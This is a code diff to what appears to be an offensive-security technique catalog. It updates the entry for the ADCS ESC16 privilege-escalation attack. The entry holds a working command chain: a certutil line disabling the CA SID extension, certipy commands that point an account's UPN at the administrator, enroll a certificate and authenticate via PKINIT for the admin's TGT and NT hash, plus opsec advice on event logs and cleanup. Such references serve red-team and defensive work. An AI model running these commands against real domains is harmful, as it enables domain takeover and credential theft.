@@ -16,28 +16,29 @@ export const adBoxesNodes: TechniqueNodeDef[] = [
     id: 'adcs-esc16',
     label: 'ADCS ESC16 (CA Security Extension Disabled)',
     phase: 'priv-esc',
-    summary: 'CA-wide disable of the SID security extension → request a cert with an arbitrary SAN to impersonate any principal.',
+    summary: 'SID security extension disabled CA-wide → a cert maps to a victim by UPN alone: set your account UPN to a target, enroll, authenticate as them.',
     description:
-      "ESC16 is a CA-wide state where the szOID_NTDS_CA_SECURITY_EXT OID (1.3.6.1.4.1.311.25.2) is added to the CA's DisableExtensionList, so issued certificates omit the requester's SID binding and strong certificate mapping can no longer pin a cert to its account. An attacker (often via ManageCA / ESC7) then requests a certificate supplying an arbitrary SAN UPN for a privileged target and authenticates with it via PKINIT to recover that target's TGT / NT hash. Frequently chained with ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2) to also spoof the SAN-URL SID and defeat the 2022 SID-binding hardening.",
+      "ESC16 is a CA-wide state where szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) is on the CA's DisableExtensionList, so every issued certificate carries no SID and the DC can only map it to an account by UPN. Like ESC9, an attacker who can write the userPrincipalName of an account they control sets it to a privileged target (e.g. administrator), enrolls an ordinary client-auth cert, reverts the UPN, then authenticates via PKINIT: the DC maps the cert to the target by UPN and returns its TGT / NT hash. Because no SID extension exists CA-wide, the 2022 StrongCertificateBindingEnforcement hardening cannot pin the cert to the real account. This is NOT the ESC1 'arbitrary SAN' trick: the default User template forbids requester-supplied subjects, so the bypass is the implicit UPN mapping. Setting the CA flag needs ManageCA (often reached via ESC7).",
     tools: [
       { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
-      { name: 'Certify (GhostPack)', url: 'https://github.com/GhostPack/Certify' },
+      { name: 'certutil (Microsoft)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil' },
     ],
     commands: [
-      { label: 'Enable ESC16 (disable security extension) via ManageCA', code: r`Certify.exe manage-ca --ca DC01.corp.local\CORP-CA --esc16`, lang: 'powershell' },
-      { label: 'Request an admin cert with a spoofed UPN', code: r`certipy-ad req -u svc_infra -p 'PASS' -dc-host dc01.corp.local -ca CORP-CA -template User -upn administrator@corp.local`, lang: 'bash' },
-      { label: 'Authenticate with the forged cert (PKINIT) → TGT + NT hash', code: r`certipy-ad auth -pfx administrator.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
+      { label: 'Set the CA state (needs ManageCA), then restart the CA', code: r`certutil -config "DC01.corp.local\CORP-CA" -setreg policy\DisableExtensionList +1.3.6.1.4.1.311.25.2
+net stop certsvc && net start certsvc`, lang: 'cmd' },
+      { label: "Point a controlled account's UPN at the target", code: r`certipy-ad account update -u svc_infra -p 'PASS' -dc-ip 10.0.0.1 -user svc_infra -upn administrator`, lang: 'bash' },
+      { label: 'Enroll an ordinary client-auth cert as that account, then revert the UPN', code: r`certipy-ad req -u svc_infra -p 'PASS' -dc-ip 10.0.0.1 -ca CORP-CA -template User
+certipy-ad account update -u svc_infra -p 'PASS' -dc-ip 10.0.0.1 -user svc_infra -upn svc_infra@corp.local`, lang: 'bash' },
+      { label: 'Authenticate as the target via PKINIT → TGT + NT hash', code: r`certipy-ad auth -pfx administrator.pfx -username administrator -domain corp.local -dc-ip 10.0.0.1`, lang: 'bash' },
     ],
     mitre: mitre('T1649'),
     references: [
-      { label: 'HackTricks, AD CS Domain Escalation (ESC16)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
-      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2' },
-      { label: 'Certipy Wiki, Privilege Escalation (ESC1-16)', url: 'https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation' },
       { label: 'HackingArticles, ADCS ESC16 (Security Extension Disabled Globally)', url: 'https://www.hackingarticles.in/adcs-esc16-security-extension-disabled-on-ca-globally/' },
+      { label: 'Certipy Wiki, Privilege Escalation (ESC1-ESC16)', url: 'https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation' },
       { label: 'The Hacker Recipes, AD CS access controls', url: 'https://www.thehacker.recipes/ad/movement/adcs/access-controls' },
     ],
-    requires: ['ManageCA right on the CA (or a pre-existing CA misconfiguration)', 'Enrollment rights to any client-auth template'],
-    opsec: 'Toggling DisableExtensionList restarts the CA service (logged) and affects ALL future certificates domain-wide; the cert request + PKINIT auth raise 4886/4887/4768. Revert the CA flag after use.',
+    requires: ['ManageCA on the CA to set DisableExtensionList (or the CA already in that state)', 'Write access to userPrincipalName on an account you control'],
+    opsec: 'Toggling DisableExtensionList restarts the CA service (logged) and affects ALL future certificates domain-wide; the UPN edits and the cert request + PKINIT auth raise 5136/4886/4887/4768. Revert the UPN and the CA flag after use.',
     difficulty: 'medium',
   },
   {
